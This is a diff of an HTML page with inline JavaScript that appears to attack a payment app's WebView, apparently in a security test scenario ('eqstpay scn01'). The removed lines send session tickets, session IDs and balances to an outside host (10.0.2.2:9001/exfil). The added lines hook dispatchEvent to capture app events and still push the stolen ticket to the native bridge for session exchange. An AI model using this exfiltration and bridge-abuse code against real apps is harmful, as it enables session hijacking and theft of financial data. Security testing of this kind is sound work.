@@ -4,39 +4,27 @@
 <body>
 <pre id="log"></pre>
 <script>
-var S="http://10.0.2.2:9001";
 var o=document.getElementById("log");
 function log(m){o.textContent+=m+"\n";}
-function send(data){
-  var img=new Image();
-  img.src=S+"/exfil?d="+encodeURIComponent(data);
-}
-function rn(msg){
-  try{window.ReactNativeWebView.postMessage(JSON.stringify(msg));}catch(x){}
-}
 
-log("loaded");
+// 모든 eqstpay 이벤트 캡처
+var origDispatch=EventTarget.prototype.dispatchEvent;
+EventTarget.prototype.dispatchEvent=function(event){
+  if(event&&event.type&&event.type.indexOf("eqstpay")>=0){
+    log("EVENT:"+event.type+" detail="+JSON.stringify(event.detail));
+  }
+  return origDispatch.call(this,event);
+};
+
+log("loaded, interceptor active");
 
 window.addEventListener("eqstpay:scn01:ticket",function(e){
   var t=e.detail&&e.detail.ticket;
   if(!t)return;
-  log("ticket="+t);
-  send("TICKET:"+t);
-  rn({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t});
+  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t}));}catch(x){}
 });
 
-window.addEventListener("eqstpay:scn01:session",function(e){
-  var d=e.detail||{};
-  log("session="+JSON.stringify(d));
-  send("SESSION:"+d.sessionId);
-  rn({channel:"REPORT",action:"READ"});
-});
-
-window.addEventListener("eqstpay:scn01:report",function(e){
-  var r=(e.detail&&e.detail.report)||{};
-  log("balance="+r.balance);
-  send("BALANCE:"+r.balance);
-});
+// REPORT/READ 안 보냄 — Runner가 자동으로 뭘 보내는지 관찰
 </script>
 </body>
 </html>
